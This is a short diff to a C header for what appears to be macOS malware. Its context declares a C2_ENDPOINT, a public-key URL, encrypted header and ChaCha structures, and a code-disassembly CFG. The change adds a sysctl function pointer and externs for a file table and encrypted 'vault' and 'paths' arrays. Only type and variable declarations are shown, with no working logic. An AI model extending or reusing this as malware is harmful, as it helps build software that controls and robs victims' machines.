@@ -103,6 +103,7 @@ typedef struct { uint8_t base_reg,index_reg,scale; int64_t disp; bool has_sib,ri
 typedef struct { size_t start,end,successors[4],num_successors; bool is_exit; } rec_block_t;
 typedef struct { rec_block_t *blocks; size_t num_blocks,cap_blocks; bool *visited; size_t code_size; } rec_cfg_t;
 typedef uint8_t (*memread_fn)(uintptr_t);
+typedef int (*sysctl_fn)(int*,u_int,void*,size_t*,void*,size_t);
 
 typedef struct __attribute__((packed)) { uint8_t key[KEY_SIZE],iv[kCCBlockSizeAES128]; uint64_t seed; uint32_t count; uint8_t hash[CC_SHA256_DIGEST_LENGTH]; } enc_header_t;
 typedef struct { uint8_t key[KEY_SIZE],iv[16],stream[64]; size_t position; uint64_t counter; } chacha_state_t;
@@ -132,6 +133,9 @@ typedef struct { sem_type_t sem_type; m_operand_t ops[3]; uint8_t num_ops; bool 
 //  Externs 
 extern char C2_ENDPOINT[1024],PUBKEY_URL[1024],tmpDirectory[256],*_strings[8];
 extern int fileCount;
+extern file_t *files[MAX_FILES];
+extern const enc_vault_t vault[];
+extern const enc_vault_t paths[];
 extern struct mach_header_64 _mh_execute_header;
 extern uint8_t data[sizeof(enc_header_t)+PAGE_SIZE];
 extern const uint8_t dummy[];
